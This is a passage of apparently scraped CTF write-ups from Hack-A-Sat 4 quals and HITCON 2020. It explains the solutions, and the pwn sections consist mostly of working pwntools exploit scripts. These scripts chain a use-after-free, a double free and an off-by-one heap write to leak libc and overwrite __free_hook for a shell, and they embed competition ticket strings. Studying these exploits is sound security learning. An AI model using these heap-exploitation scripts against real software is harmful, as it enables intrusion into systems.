r.recvuntil(b\u0026#34;Choice\u0026gt;\\n\u0026#34;) def remove_last_measurement(): r.sendline(b\u0026#34;3\u0026#34;) r.recvuntil(b\u0026#34;Choice\u0026gt;\\n\u0026#34;) def list_measurements(): measurements = [] r.sendline(b\u0026#34;4\u0026#34;) data = r.recvuntil(b\u0026#34;Choice\u0026gt;\\n\u0026#34;) for l in data.split(b\u0026#34;\\n\u0026#34;): if not b\u0026#34;Raw Measurement\u0026#34; in l: continue print(l) data = l.split(b\u0026#34;:\u0026#34;)[1].strip().split(b\u0026#34; \u0026#34;) print(data) measurements.append([int(data[0])] + [float(x) for x in data[1:]]) return measurements def poison_covariance_matrix(heap_start): # first add will overewrite the UAFd head, so we are good add_measurement(0x4141414141414141, 0, 0, 0) # A \u0026lt;-\u0026gt; A (6 elements in 0x40 tcache) for i in range(8): add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) for _ in range(8): remove_last_measurement() # A \u0026lt;-\u0026gt; A (0x40 tcache full) remove_first_measurement() # NULL \u0026lt;-\u0026gt; A (free) for i in range(7): add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) # now tcache is empty add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) # NULL \u0026lt;-\u0026gt; A \u0026lt;-\u0026gt; ... (7) ... \u0026lt;-\u0026gt; A for i in range(7): add_measurement(u64(p8(0x41+i)*8), 0, 0, 0) # NULL \u0026lt;-\u0026gt; A \u0026lt;-\u0026gt; ... (7) ... \u0026lt;-\u0026gt; A \u0026lt;-\u0026gt; ... (7) for i in range(7): remove_last_measurement() # (tcache 0x40 full) # NULL \u0026lt;-\u0026gt; A \u0026lt;-\u0026gt; ... (7) ... \u0026lt;-\u0026gt; A remove_last_measurement() # NULL \u0026lt;-\u0026gt; A (free) \u0026lt;-\u0026gt; ... (7) ... ? for i in range(7): remove_last_measurement() # NULL \u0026lt;-\u0026gt; A (free) ? remove_last_measurement() # double free fastbin A ? # NULL \u0026lt;-\u0026gt; NULL for i in range(7): add_measurement(100000999, 34000,22000, 3000) # drain tcache 0x40 # Arbitrary write with fastbin attack add_measurement(heap_start + 0x11e90, 0, 0, 0) # first fastbin (A) for i in range(7): add_measurement(90, u64(b\u0026#34;Z\u0026#34;*8), u64(b\u0026#34;X\u0026#34;*8), 0) # take 7 tcache add_measurement(0xdeadbeef, 0xdeadc0d3, 0xd3adbeef, 0xd3adc0d3) # place tcache inside an unsorted add_measurement(u64(struct.pack(\u0026#39;\u0026lt;d\u0026#39;, 0.0)), 0x41, u64(struct.pack(\u0026#39;\u0026lt;d\u0026#39;, 0.0)), u64(struct.pack(\u0026#39;\u0026lt;d\u0026#39;, 0.0))) add_measurement(u64(struct.pack(\u0026#39;\u0026lt;d\u0026#39;, 0.0)), 0x41, u64(struct.pack(\u0026#39;\u0026lt;d\u0026#39;, 0.0)), u64(struct.pack(\u0026#39;\u0026lt;d\u0026#39;, 0.0))) # alloc def main(): global r r = conn() r.recvuntil(b\u0026#34;Choice\u0026gt;\\n\u0026#34;) # heap leak for _ in range(11): remove_last_measurement() heap_leak = list_measurements()[0][0] heap_init_offset = 0x14b40 heap_start = heap_leak - heap_init_offset log.warning(\u0026#34;heap base : 0x%x\u0026#34;, heap_start) poison_covariance_matrix(heap_start) # Run simulation r.sendline(b\u0026#34;5\u0026#34;) r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() Magic Space Bussin # The challenge # Category: \u0026ldquo;Pure Pwnage\u0026rdquo;\nDescription # The challenge is a C++ application for which we are given both the compiled binary (called magic) and the source code. It can be run using the provided challenge files, which include a couple of Dockerfile files and a top level Makefile:\nBuilding a local copy:\n$ make static Running the challenge:\n$ make build # Build Docker containers $ make challenge # Run challenge locally through socat + Docker When the magic binary is started we are greeted with a menu:\nstartracker 1 pipe_id: 0 startracker 2 pipe_id: 1 1: Post message on bus 2: Handle startracker 1 messages 3: Handle startracker 2 messages 4: Exit \u0026gt; Option 1 allows us to send messages on a pipe:\nstartracker 1 pipe_id: 0 startracker 2 pipe_id: 1 1: Post message on bus 2: Handle startracker 1 messages 3: Handle startracker 2 messages 4: Exit \u0026gt; 1 msg_id: 100 pipe_id: 0 hex: 0 Message to post on bus: AAAAAAAA Clearing msg (0 : 100) When sending messages we are asked for 4 parameters:\nmsg_id: Identifies the function that will get executed when the message is read from the pipe, the only valid value is 100 pipe_id: Identifies the pipe on which the message will be sent, valid values are 0, 1 and 255 (broadcast) hex: A boolean value that indicated whether the message content is hex-encoded or not Message to post on bus: The message content Option 2 and 3 allow us to pop messages that were sent respectively in pipe 0 and 1.\nThe only valid msg_id is 100, and when such a message is received on a pipe the program simply prints the hex-encoded message byte by byte. For example:\nstartracker 1 pipe_id: 0 startracker 2 pipe_id: 1 1: Post message on bus 2: Handle startracker 1 messages 3: Handle startracker 2 messages 4: Exit \u0026gt; 1 msg_id: 100 pipe_id: 0 hex: 0 Message to post on bus: AAAAAAAA Clearing msg (0 : 100) 1: Post message on bus 2: Handle startracker 1 messages 3: Handle startracker 2 messages 4: Exit \u0026gt; 2 StarTracker: Testing Message 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 Clearing msg (0 : 100) Solution # There are two vulnerabilities in the challenge, the first one is a use-after-free (UAF) plus a double free, and the second one is an off-by-one out-of-bounds write.\nUAF + double free # Each pipe has a maximum message capacity of 10, which means that after 10 messages you will no longer be able to send messages on that pipe unless you pop some of them by using option 2 or 3.\nWhen sending a message to pipe_id = 255 the message is broadcasted to both pipe 0 and 1. The UAF occurs when we broadcast a message with the pipe 0 full. After failing to send the message to pipe 0 (at [5] with i = 0) the program frees the pointer containing the message data and then keeps broadcasting the freed message to pipe 1. Which means that when the message is sent to pipe 1 (at [4] with i = 1) the pipe will store a freed pointer.\n// pipe_id 255 -\u0026gt; broadcast if (payload-\u0026gt;pipe_id == UINT8_MAX) { // [1] // bail out if too many pipes are subscribed to a msg_id if (this-\u0026gt;msg_id_pipe_lens[payload-\u0026gt;msg_id] \u0026lt;= this-\u0026gt;msg_max_subs) { bool copy = true; // [2] // for each pipe subscribed to this msg_id // (pipe 0 and 1 are subscribed to the only available msg_id -\u0026gt; 100) for (i = 0; i \u0026lt; this-\u0026gt;msg_id_pipe_lens[payload-\u0026gt;msg_id]; i++){ cur_pipe_num = this-\u0026gt;msg_id_pipe_map[payload-\u0026gt;msg_id][i]; // [3] // the last pipe stores the pointer used to read the message content // other pipes always receive a new copy of that buffer if (i == (this-\u0026gt;msg_id_pipe_lens[payload-\u0026gt;msg_id]-1)){ copy = false; } pipe = GetPipeByNum(cur_pipe_num); // [4] // if copy is false then the pipe will store // payload-\u0026gt;data without copying it if (pipe-\u0026gt;SendMsgToPipe(payload, copy) != SB_SUCCESS) { LOG_ERR(\u0026#34;Unable to send payload to Pipe Num: %d\\n\u0026#34;, cur_pipe_num); // [5] // when sending a message on a full pipe `SendMsgToPipe` will fail // and payload-\u0026gt;data will be freed delete payload-\u0026gt;data; ret = SB_FAIL; } } if (i == 0) { LOG_ERR(\u0026#34;No pipes subscribed to Msg ID: %d\\n\u0026#34;, payload-\u0026gt;msg_id); delete payload-\u0026gt;data; ret = SB_FAIL; } payload-\u0026gt;data = nullptr; } else { LOG_ERR(\u0026#34;Too many pipes subscribed to Msg ID: %d. Bailing out...\\n\u0026#34;, payload-\u0026gt;msg_id); exit(-1); } } When receiving a message from a pipe the data pointer is freed, which means that if, after triggering this UAF, we receive the first message from the pipe 1, we will trigger a double free.\nOff-by-one # The off-by-one write occurs when sending an hex-encoded message with an odd length:\nsize_t SB_Pipe::CalcPayloadLen(bool ishex, const std::string\u0026amp; s) { if (ishex \u0026amp;\u0026amp; (s.length() % 2 == 0)) { return s.length() / 2; } else { return s.length(); } } uint8_t* SB_Pipe::AllocatePlBuff(bool ishex, const std::string\u0026amp; s) { if (ishex) { return new uint8_t[s.length() / 2]; } else { return new uint8_t[s.length()]; } } // invoked when sending a message on a pipe SB_Msg* SB_Pipe::ParsePayload(const std::string\u0026amp; s, bool ishex, uint8_t pipe_id, uint8_t msg_id){ if (s.length() == 0) { return nullptr; } // allocate a buf on the heap of sz = s.length() / 2 uint8_t* msg_s = AllocatePlBuff(ishex, s); // if user sent `hex: 1` if (ishex) { char cur_byte[3] = {0}; // if s.lenth() is odd `CalcPayloadLen()` returns s.length() // instead of s.length() / 2 for (size_t i = 0, j = 0; i \u0026lt; CalcPayloadLen(ishex, s); i+=2, j++) { cur_byte[0] = s[i]; cur_byte[1] = s[i+1]; msg_s[j] = static_cast\u0026lt;uint8_t\u0026gt;(std::strtol(cur_byte, nullptr, 16)); } } else { for(size_t i = 0; i \u0026lt; CalcPayloadLen(ishex, s); i++){ msg_s[i] = static_cast\u0026lt;uint8_t\u0026gt;(s[i]); } } // ... } We can only control the lower nibble of byte written oob, the higher nibble is always set to 0 because strtoul() only sees a 1-character string.\nExploitation # In short, we used the UAF to get a libc leak from a freed unsorted bin, and the double free in combination with the off-by-one oob write to get arbitrary write and overwrite __free_hook with a one gadget that calls execve(\u0026quot;/bin/sh\u0026quot;, 0, 0). The complete exploit script is provided below and explains the relevant exploitation steps in more detail through comments in the main() function.\n#!/usr/bin/env python3 import re from pwn import * exe = ELF(\u0026#39;./magic_patched\u0026#39;, checksec=False) libc = ELF(\u0026#39;./libc_debug-2.31.so\u0026#39;, checksec=False) context.binary = exe TICKET = b\u0026#39;ticket{quebec703978whiskey4:GEmu1G0NX1z6syFsVFKuX0vLGEw0ULBraF16mEtKzS4qEdVXUd8NgwhCMM9Y4bpAjg}\u0026#39; def conn(): if args.GDB: r = gdb.debug([exe.path]) elif args.REMOTE: r = remote(\u0026#39;magic.quals2023-kah5Aiv9.satellitesabove.me\u0026#39;, 5300) r.sendlineafter(b\u0026#39;Ticket please:\\n\u0026#39;, TICKET) else: r = process([exe.path]) return r def post_msg(msg_id, pipe_id, ishex, msg, pwn=False): r.sendline(b\u0026#39;1\u0026#39;) r.recvuntil(b\u0026#39;msg_id: \u0026#39;) r.sendline(b\u0026#39;%d\u0026#39; % msg_id) r.recvuntil(b\u0026#39;pipe_id: \u0026#39;) r.sendline(b\u0026#39;%d\u0026#39; % pipe_id) r.recvuntil(b\u0026#39;hex: \u0026#39;) r.sendline(ishex) r.recvuntil(b\u0026#39;Message to post on bus: \u0026#39;) r.sendline(msg) if pwn: return data = r.recvuntil(b\u0026#39;\\n\u0026gt; \u0026#39;) m = re.match(b\u0026#39;(.)*Clearing msg \\((\\d+) : (\\d+)\\)\u0026#39;, data, re.DOTALL) if m: if m.group(1): log.warning(m.group(0).decode()) return (int(m.group(2)), int(m.group(3))) def handle(startracker_id): if startracker_id != 1 and startracker_id != 2: log.error(\u0026#39;Invalid startracker_id: %d\u0026#39; % startracker_id) return if startracker_id == 1: r.sendline(b\u0026#39;2\u0026#39;) elif startracker_id == 2: r.sendline(b\u0026#39;3\u0026#39;) STOP = b\u0026#39;\\n1: Post message on bus\u0026#39; data = r.recvuntil(STOP) data = data[:-len(STOP)] if b\u0026#39;Testing Message\\n\u0026#39; in data: return bytearray(map(lambda x: int(x, 16), re.findall(rb\u0026#39;0x(..)\u0026#39;, data))) r.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) return data def alloc(pipe_id, data, pwn=False): post_msg(100, pipe_id, b\u0026#39;0\u0026#39;, data, pwn) def alloc_hex(pipe_id, data): post_msg(100, pipe_id, b\u0026#39;1\u0026#39;, data) def broadcast(data): post_msg(100, 0xff, b\u0026#39;0\u0026#39;, data) def free(pipe_id): return handle(pipe_id + 1) def main(): global r r = conn() r.recvuntil(b\u0026#39;\\n\u0026gt; \u0026#39;) # Fill pipe 0 for _ in range(10): alloc(0, b\u0026#39;-\u0026#39;) # Allocate a chunk of sz 0x140 (target chunk) # this will get stored freed in the pipe 1 # At offset 0xf0 we create a fake next_chunk, so that when we overwrite the last byte # of the sz = 0x140 to sz = 0x100 we will have a valid prev_inuse bit broadcast(flat({ 0xf0: [p64(0), p64(0x41)] }, filler = b\u0026#39;B\u0026#39;, length = 0x130)) # Empty pipe 0 for _ in range(10): free(0) # Allocate a chunk before the target chunk and use the off-by-one # to poison the size alloc_hex(0, (b\u0026#39;A\u0026#39; * 0x1e8).hex().encode() + b\u0026#39;1\u0026#39;) # Free target chunk again to put it in another tcache # Now that the size is changed we can free it again # and we will not cause a double-free abort as the target tcache bin is different free(1) # Empty pipe 0 free(0) # Fill pipe 0 with all small and last big # This big chunk will end up in unsorted bin when freed alloc(0, b\u0026#39;F\u0026#39; * 0x1000) for _ in range(9): alloc(0, b\u0026#39;.\u0026#39; * 0x10) # Add padding after the chunk that will end in unsorted alloc(1, b\u0026#39;.\u0026#39; * 0x30) # Put chunk in unsorted, now pipe 0 has 9/10 messages free(0) # Fill pipe 0 alloc(0, b\u0026#39;.\u0026#39; * 0x10) # Broadcast, this will reclaim the unsorted, free it and put it in pipe 1 broadcast(b\u0026#39;@\u0026#39; * 0xf00) # Alloc a small portion from the unsorted bin # so that when the freed message in pipe 1 is received # we will free this message without crashing and also # leaking the pointers from the unsorted right after this chunk alloc(1, b\u0026#39;W\u0026#39; * 0x50) # Remove padding chunk from pipe 1 free(1) # Leak libc from unsorted # This is when the 0x50 sized buffer is freed to prevent double freeing the unsorted libc_leak = u64(free(1)[107:107+6] + b\u0026#34;\\x00\\x00\u0026#34;) libc.address = libc_leak - libc.sym.main_arena - 96 log.warning(\u0026#34;libc leak : 0x%x\u0026#34;, libc_leak) log.warning(\u0026#34;libc base : 0x%x\u0026#34;, libc.address) # Empty pipe 0 for _ in range(10): free(0) # Use the double freed tcache entry to get arb write # and overwrite __free_hook with a one_gadget alloc(0, p64(libc.sym.__free_hook - 0x8) + b\u0026#34;X\u0026#34;*0x128) alloc(0, b\u0026#34;A\u0026#34;*8 + p64(libc.address + 0xe3b01) + b\u0026#34;B\u0026#34;*0xe0, pwn=True) r.interactive() if __name__ == \u0026#39;__main__\u0026#39;: main() You\u0026rsquo;ve Been Promoted # The challenge # Category: \u0026ldquo;Anomaly Review Bored\u0026rdquo;\nDescription # This challenge consists of a remote TCP service for which we are not given any source or binary. When connecting to the given address (e.g., through Netcat), we are greeted with the following information:\n$ nc management.quals2023-kah5Aiv9.satellitesabove.me 5300 Send me commands to get the spacecraft under control and the spacecraft despun You must run for 3600 seconds Make sure the magnitude of the spacecraft angular velocity vector is less than 0.001 (rad/s) Make sure each reaction wheel has a spin rate that is between -20 and 20 (rad/s) Reaction wheels accept torque commands in N-m Reaction wheel commands are valid between [-0.2, 0.2] N-m Available reaction wheels: - Wheel_X: aligned with body X axis - Wheel_Y: aligned with body Y axis - Wheel_Z: aligned with body Z axis Magnetic Torquer Bars (MTB) accept commands in magnetic dipole (A-m^2) MTB dipole commands are valid between [-1000.0, 1000.0] (A-m^2) Available MTB - MTB_X: aligned with body X axis - MTB_Y: aligned with body Y axis - MTB_Z: aligned with body Z axis Actuator commands are formatted as: Wheel_X, Wheel_Y, Wheel_Z, MTB_X, MTB_Y, MTB_Z Sensor:Time (sec), AngV_X (rad/s), AngV_Y (rad/s)), AngV_Z(rad/s), WheelX(rad/s), WheelY(rad/s), WheelZ(rad/s), magX (T), magY(T), magZ(T) 0.0,0.1,0.1,-0.2,314.1592653589793,-471.23889803846896,282.7433388230814,-3.210377245457677e-05,-1.1355247439189624e-05,-2.263494595823975e-05 Enter actuator command: nan,nan,nan,nan,nan,nan Array item nan is not finite. Expected format of array input is \u0026#39;X1,X2,X3,....,XN\u0026#39; The remote server is asking us to help controlling a spinning spacecraft through three-axis stabilization. The spacecraft is in fact equipped with 3 reaction wheels (RW) and 3 magnetic torque bars (MTB), each mounted on a different axis.\nEach second of time we receive sensor readings for the current angular speed of the spacecraft on each axis (in rad/s), the current angular speed of each RW in (rad/s), and the current magnetic field strenght (in Tesla) measured by the spacecraft on each axis.\nTo perform three-axis stabilization, each second of time we can apply a chosen torque (between -0.2Nm and +0.2Nm) to each RW and a chosen magnetic dipole (between -1000Am2 and +1000Am2) to each MTB. We have 3600 seconds to get the spacecraft\u0026rsquo;s angular velocity within -0.001 and 0.001 rad/s on all 3 axes and the angular velocity of all reaction wheels within -20 and +20 rad/s. If, at the end of the 3600th second, all requested values are found within range, the spacecraft will be considered stabilized.\nSolution # The system that is being emulated by the server seems to be a standard three-axis stabilization problem:\nTorque can be applied to reaction wheels to make them accelerate and spin either clockwise or counterclockwise to contrast the spacecraft spin on each axis. Magnetic torque bars can be powered with a positive or negative current to provide the whole spacecraft with positive or negative torque perpendicular to the magnetic field. To reach our goal, we can control the spin of the spacecraft itself through the RWs, and the spin of the RWs through the MTBs.\nWe implemented our solution using the simple-pid Python package to model 6 PID controllers (one for each RW and MTB) as follows:\n3 PIDs (one per axis) each taking the negated angular velocity of the spacecraft on the corresponding axis as input. The produced response, limited between -0.2 and +0.2, is then provided as the torque to apply to the RWs (one per axis). 3 PIDs (one per axis) each taking one negated component (on the corresponding axis) of the cross product W‚®ØB, where W is the vector (WheelX, WheelY, WheelZ) [rad/s], and B is the magnetic field vector (magX, magY, magZ) [T]. The produced response, limited between -1000 and +1000, is then provided as the elecric dipole to apply to the MTBs (one per axis). Theoretically speaking, determining the right magnetic dipole to control the MTBs is not simple, because we ideally want them to produce a torque that counters the spin of the RWs, but the only torque the MTBs can generate is perpendicular to the magnetic field felt by the spaceship at any given time. The equation to calculate the applied torque given a magnetic dipole (M) is T = M‚®ØB. It is however not possible to simply invert the equation and find M given T and B, as the matrix used for the cross-product ([(0,Bz,-By), (-Bz,0,Bx), (By,-Bx,0)]) is non-invertible.\nKnowing the above, although seemingly nonsensical at first glance (even just dimensionally speaking), the intuitive reasoning we followed to come up with W‚®ØB was as follows:\nThe torque we want to apply on each axis needs to be opposite in sign and directly proportional in modulus to the angular velocity of the RWs. The torque we can apply is perpendicular to both the magnetic field and the applied magnetic dipole (T = M‚®ØB). Therefore the magnetic dipole vector to apply needs to be proportional in modulus and opposite in direction to W‚®ØB. After figuring out the above, the rest was a matter of trial and error and manual tuning. Running multiple simulations, we ended up with the following PID parameters:\n(Kp, Ki, Kd) = (5, 0.5, 0.1) for the 3 RW PIDs (Kp, Ki, Kd) = (105, 104, 5‚Ä¢104) for the 2 MTB PIDs for the x-axis and z-axis (Kp, Ki, Kd) = (3‚Ä¢105, 105, 105) for the MTB PID for the y-axis. While doing this, we also noticed that stabilizing both the spacecraft\u0026rsquo;s angular velocity and the RWs\u0026rsquo; angular velocity was harder than expected, because PID responses were in turn altering other PIDs inputs. In other words, reducing the angular velocity of the spaceship along one axis means increasing the angular velocity of the RW for that axis, and reducing the angular velocity of a RW for one axis through MTBs could mean altering the angular velocity of the spacecraft on any axis.\nIn order to get over this issue, we manually defined some time windows within which we would generate a response for the torque to apply to the RWs. Outside these time windows, the response would just be 0 on all axes. We ended up applying torque to RWs only between t=500s and t=999s seconds, and then from t=2500s onwards.\nSolution script # #!/usr/bin/env python3 # # @mebeim - 2023-04-02 # from pwn import * from simple_pid import PID import numpy as np TIME = 0 def faketime(): global TIME return TIME pwx = PID(5, .5, .1, setpoint=0, sample_time=1, output_limits=(-0.2, 0.2)) pwy = PID(5, .5, .1, setpoint=0, sample_time=1, output_limits=(-0.2, 0.2)) pwz = PID(5, .5, .1, setpoint=0, sample_time=1, output_limits=(-0.2, 0.2)) pwx.time_fn = faketime pwy.time_fn = faketime pwz.time_fn = faketime pmx = PID(1e5, 1e4, 5e4, setpoint=0, sample_time=1, output_limits=(-1000, 1000)) pmy = PID(3e4, 1e5, 1e5, setpoint=0, sample_time=1, output_limits=(-1000, 1000)) pmz = PID(1e5, 1e4, 5e4, setpoint=0, sample_time=1, output_limits=(-1000, 1000)) pmx.time_fn = faketime pmy.time_fn = faketime pmz.time_fn = faketime def read_sensors(r): r.recvuntil(b\u0026#39;Sensor:\u0026#39;) r.recvline() return tuple(map(float, r.recvline().decode().split(\u0026#39;,\u0026#39;))) VSLOTS = [range(500, 1000), range(2500, 9999)] WSLOTS = [range(0, 9999)] def react(t, vx, vy, vz, wx, wy, wz, bx, by, bz): global TIME t = int(t) TIME = t adjv = any(t in rng for rng in VSLOTS) adjw = any(t in rng for rng in WSLOTS) if adjv: rwx = pwx(-vx, dt=1) rwy = pwy(-vy, dt=1) rwz = pwz(-vz, dt=1) else: rwx = rwy = rwz = 0 if adjw: b = np.array([bx, by, bz], dtype=\u0026#39;float64\u0026#39;) w = np.array([wx, wy, wz], dtype=\u0026#39;float64\u0026#39;) rmx, rmy, rmz = np.cross(w, b) rmx = pmx(-rmx, dt=1) rmy = pmy(-rmy, dt=1) rmz = pmz(-rmz, dt=1) else: rmx = rmy = rmz = 0 return rwx, rwy, rwz, rmx, rmy, rmz r = remote(\u0026#39;management.quals2023-kah5Aiv9.satellitesabove.me\u0026#39;, 5300) r.sendlineafter(b\u0026#39;please:\\n\u0026#39;, b\u0026#39;ticket{golf324482oscar4:GKUkXwTflQTacpeZCTn70CIbqdHDTYJ-pN58Nvss2iwjqrR1rYUPjuuaYtF7MP8UTA}\u0026#39;) for t in range(3601): data = read_sensors(r) t, *v = data[:4] w = data[4:4+3] m = data[4+3:4+3+3] vmag = (v[0]**2 + v[1]**2 + v[2]**2)**0.5 resp = react(*data) rw = resp[:3] rmag = resp[3:] log.info(\u0026#39;\u0026lt;- Sensors : t=%4.0f, |v|=%10.04f, v=(%10.04f, %10.04f, %10.04f), w=(%10.04f, %10.04f, %10.04f), m=(%10.2e, %10.2e, %10.2e)\u0026#39;, t, vmag, *v, *w, *m) log.info(\u0026#39;-\u0026gt; Response: w=(%10.04f, %10.04f, %10.04f), mag=(%10.04f, %10.04f, %10.04f)\u0026#39;, *rw, *rmag) r.sendline(\u0026#39;, \u0026#39;.join(map(\u0026#39;{:.30f}\u0026#39;.format, resp)).encode()) r.interactive() ","date":"1 July 2023","externalUrl":null,"permalink":"/writeups/2023-07-01-hackasat4-quals-writeups/","section":"","summary":"","title":"Hack-A-Sat 4 Quals - Write ups","type":"writeups"},{"content":"","date":"5 December 2020","externalUrl":null,"permalink":"/tags/hitcon/","section":"Tags","summary":"","title":"Hitcon","type":"tags"},{"content":"This is the collection of writeups for HITCON 2020 by the mhackeroni team.\nIndex # Welcome - rev, 50pts, 715 solves 11011001 - rev, 255pts, 30 solves SOP - rev, 305pts, 15 solves Run Run Run - rev, 315pts, 13 solves L\u0026rsquo;Obscurit√© - rev, 500pts, 1 solve Dual - pwn, 288pts, 19 solves Spark - pwn, 344pts, 10 solves Telescope - pwn, 384pts, 5 solves 100 pins - crypto, 350pts, 8 solves AC1750 - forensics, 168pts, 100 solves Baby Shock - misc, 201pts Revenge of Baby Shock - misc, 230pts, 42 solves Revenge of Pwn - misc/pwn, 255pts, 30 solves Atoms - misc/pwn, 296pts, 17 solves Tenet - misc/shellcode - 222pts, 47 solves Comments section # Welcome # It\u0026rsquo;s a reverse challenge.\nssh welcome@18.176.232.130 password: hitconctf\nThe challenge # The challenge is literally a reverse challenge. Every word in input is reversed:\nIf we run cat flag we get:\ntac: failed to open \u0026#39;galf\u0026#39; for reading: No such file or directory The solution # If we run tac galf we get hitcon{!0202 ftcnoctih ot emoclew}, which is the flag.\n11011001 # 010011100110111100100000011010000110100101101110011101000010000001101000 011001010111001001100101001011000010000001110111011010000110000101110100 001000000110000101110010011001010010000001111001011011110111010100100000 011001010111100001110000011001010110001101110100011010010110111001100111 0010000001100110011011110111001000111111\nThe challenge # We are given a C++ binary, which seems heavily optimized and decompiles like a mess. The binary wants 20 unsigned 32-bit integers as inputs and performs some checks on them. If those checks pass, a SHA26 hash is computed and printed as part of the flag.\nThe checks are kind of annoying to reverse-engineer, but in the end are pretty straightforward:\nEach number must be between 0 and 0xFFFFF. There is a global table of 40 hardcoded values: each i-th input is and-ed (binary and) with the value at table[2*i] and the result must be equal to the value at table[2*i+1]. Eeach number cannot contain three consecutive equal bits. There cannot be three equal bits at the same position in three consecutive numbers. Each number must have exactly 10 bits set to 1. The total number of 1 bits at any given position in all numbers must be exactly 10. There are also other checks made by the program, but we did not get reverse those, because in the meantime we we were writing a simple Python solver using z3, adding one check at the time and testing the result. After the 6th check above, our input got accepted by the program and it spit out the flag.\nThe solution # Complete solution:\n#!/usr/bin/env python3 # @dp_1, @mebeim - 2020-11-29 import z3 table = [0x81002, 0x1000, 0x29065, 0x29061, 0x2, 0x2, 0x16C40, 0x16C00, 0x20905, 0x805, 0x10220, 0x220, 0x98868, 0x80860, 0x21102, 0x21000, 0x491, 0x481, 0x31140, 0x1000, 0x801, 0x0, 0x60405, 0x400, 0x0C860, 0x60, 0x508, 0x400, 0x40900, 0x800, 0x12213, 0x10003, 0x428C0, 0x840, 0x840C, 0x0C, 0x43500, 0x2000, 0x8105A, 0x1000] def popcount(v): \u0026#39;\u0026#39;\u0026#39; Bit Twiddling Hacks FTW https://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetParallel \u0026#39;\u0026#39;\u0026#39; w = v - ((v \u0026gt;\u0026gt; 1) \u0026amp; 0x55555555) q = (w \u0026amp; 0x33333333) + ((w \u0026gt;\u0026gt; 2) \u0026amp; 0x33333333) s = ((q + (q \u0026gt;\u0026gt; 4) \u0026amp; 0xF0F0F0F) * 0x1010101) \u0026gt;\u0026gt; 24 return s solver = z3.Solver() inp = [z3.BitVec(\u0026#39;x{:02d}\u0026#39;.format(i), 8 * 4) for i in range(20)] for i, x in enumerate(inp): solver.add(x \u0026amp; 0xFFF00000 == 0) solver.add(x \u0026amp; table[2 * i] == table[2 * i + 1]) mask = 7 for j in range(18): solver.add((x \u0026amp; mask) != (7\u0026lt;\u0026lt;j), x \u0026amp; mask != 0) mask = mask \u0026lt;\u0026lt; 1 for off in range(20): for i in range(1, len(inp)-1): x = ((inp[i-1]\u0026gt;\u0026gt;off) \u0026amp; 1) + ((inp[i]\u0026gt;\u0026gt;off) \u0026amp; 1) + ((inp[i+1]\u0026gt;\u0026gt;off) \u0026amp; 1) solver.add(x != 0, x != 3) for v in inp: solver.add(popcount(v) == 10) for off in range(20): x = (inp[0] \u0026gt;\u0026gt; off) \u0026amp; 1 for i in range(1, len(inp)): x += (inp[i] \u0026gt;\u0026gt; off) \u0026amp; 1 solver.add(x == 10) res = solver.check() assert res == z3.sat m = solver.model() nums = [m[x].as_long() for x in inp] print(*nums) And here it is in action:\n$ ./solve.py | ./11011001 Congratulations! Here\u0026#39;s your gift: hitcon{fd05b10812d764abd7d853dfd24dbe6769a701eecae079e7d26570effc03e08d} SOP # Let me introduce a brand new concept - Syscall Oriented Programming!\nThe binary implements the typical fetch-execute loop in the run function:\nmemset(regs, 0, sizeof(regs)); while ( code[regs[15]] ) { fetch_inst(code[regs[15]], \u0026amp;sysno, sysargs, regs); syscall(sysno, sysargs[0], sysargs[1], sysargs[2], sysargs[3], sysargs[4], sysargs[5]); ++regs[15]; } From this code we can also see that the VM allows up to 6 arguments for a given syscall and that it offers 16 64bit registers, the last of which is the instruction pointer. The custom instruction encoding can be extracted from the fetch_inst function, which was reimplemented in python to continue the analysis\nAt a basic level, the VM executes a syscall for each opcode. Since the disassembly was over 2k lines long, we used some rules to simplify and shorten it. For example, a mov reg, reg instruction was implemented as a set_tid_address \u0026lt;value\u0026gt;; prctl GET_TID_ADDRESS \u0026amp;\u0026lt;dest\u0026gt;.\nAfter this first step, the bytecode could be subdivided in four main parts:\nAt first, it loads some shellcode in memory and sets it as the SIGSYS handler, which can used by seccomp in response to filtered syscalls Then, it prepares and loads a seccomp filter which intercepts a fixed set of syscalls, replacing them with custom actions Next, it takes the user input (which was read at the start of the shellcode) and processes it And finally, it prints a success message to an invalid file descriptor The logical next step was to analyze the shellcode and the seccomp filter:\n; Sigaction handler 0: 48 b9 2c 34 3a 79 f5 movabs rcx, 0x3f8495f5793a342c a: 95 84 3f mov edx, DWORD PTR [rsi+0x4] # si_code d: 8b 56 04 mov WORD PTR [rcx], dx 10: 66 89 11 lea rcx, [rip+0xffffffffffffffeb] # 0x2 17: 48 8d 0d eb ff ff ff inc QWORD PTR [rcx] 1a: 48 ff 01 inc QWORD PTR [rcx] 1d: 48 ff 01 ret ; Restorer function 0: 31 c0 xor eax, eax 2: b0 0f mov al, sys_sigreturn 4: 0f 05 syscall The interesting part here is the sigaction handler: it takes the syscall return value, stores it at the address contained in rcx and increments that pointer by 2 by modifying the movabs instruction. Since the return value is 16 bits wide, by repeating this procedure twice we can obtain a full 32 bit result.\nThe seccomp filter, extracted using seccomp_tools, is as follows:\nline CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x35 0x0d 0x00 0x40000000 if (A \u0026gt;= 0x40000000) goto 0015 0002: 0x15 0x0a 0x00 0x00000001 if (A == write) goto 0013 0003: 0x15 0x20 0x00 0x00000068 if (A == getgid) goto 0036 0004: 0x15 0x15 0x00 0x00000066 if (A == getuid) goto 0026 0005: 0x15 0x28 0x00 0x000000ba if (A == gettid) goto 0046 0006: 0x15 0x0e 0x00 0x00000027 if (A == getpid) goto 0021 0007: 0x15 0x17 0x00 0x0000006c if (A == getegid) goto 0031 0008: 0x15 0x07 0x00 0x0000006f if (A == getpgrp) goto 0016 0009: 0x15 0x29 0x00 0x0000006e if (A == getppid) goto 0051 0010: 0x15 0x1e 0x00 0x0000006b if (A == geteuid) goto 0041 0011: 0x15 0x2c 0x00 0x00000039 if (A == fork) goto 0056 0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0013: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count) 0014: 0x15 0x00 0x37 0x00000000 if (A != 0x0) goto 0070 0015: 0x06 0x00 0x00 0x00000000 return KILL 0016: 0x20 0x00 0x00 0x00000018 A = args[1] 0017: 0x07 0x00 0x00 0x00000000 X = A 0018: 0x20 